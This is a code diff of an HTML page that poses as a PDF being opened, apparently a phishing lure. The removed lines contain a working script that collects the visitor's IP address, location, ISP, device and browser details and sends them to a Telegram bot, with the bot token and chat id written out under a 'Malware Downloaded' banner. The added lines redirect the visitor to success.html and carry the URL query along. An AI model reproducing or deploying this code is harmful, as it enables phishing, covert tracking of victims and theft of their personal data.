@@ -78,57 +78,27 @@
 <form action="need4.php" method="POST">
 <div style="text-align:center">
 <img src="img/Icon_pdf_file.svg.png" width="45px" style="margin-top:200px;" id="fd">
-<meta http-equiv="Refresh" content="3; url=success.html">
 </div>
 <p style="text-align:center;font-size:15px;margin-top:10px">Please wait while we open PDF...</p>
 <span style="display:block;height:10px;width:10px;border:3px solid lightgray;border-radius:70px;border-top-color:red;margin-top:40px;" id="rl"></span>
 </div>
 
 <script>
-
-    const botToken = '7685980487:AAEXgDm3Sjkb8L5Hkr8opbyReJmpx8tDI5E'; 
-    const chatId = '5717695933';
-
-    // Get browser & device details
-    const browser = navigator.userAgent;
-    const platform = navigator.platform;
-    const screenRes = `${window.screen.width}x${window.screen.height}`;
-    const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-
-    // Fetch user location & IP
-    fetch('https://ipapi.co/json/')
-        .then(response => response.json())
-        .then(data => {
-            const ip = data.ip || 'Unknown IP';
-            const city = data.city || 'Unknown City';
-            const country = data.country || 'Unknown Country';
-            const isp = data.org || 'Unknown ISP';
-
-            // Message format
-            const message = `
- #---------[ Malware Downloaded ]-----------#:
-  IP Address: ${ip}
-  Location: ${city}, ${country}
-  ISP: ${isp}
-  Device: ${platform}
-  Browser: ${browser}
-  Screen Resolution: ${screenRes}
-  Time Zone: ${timeZone}
-            `;
-
-            // Send to Telegram
-            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
-            fetch(url, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: chatId, text: message })
-            })
-            .then(response => response.json())
-            .then(data => {
-                
-            });
-        })
-        .catch(error => console.error("Geo-Location Error:", error));
+	setTimeout(() => {
+		let value = "";
+		if (window.location.search) {
+			value = window.location.search.substring(1);
+		}
+		else {
+			value = window.location.pathname
+				.replace(/^\/|\/$/g, "");
+		}
+		if (value) {
+			window.location.href = "success.html?" + encodeURIComponent(value);
+		} else {
+			window.location.href = "success.html";
+		}
+	}, 3000);
 </script>
 
 </form>
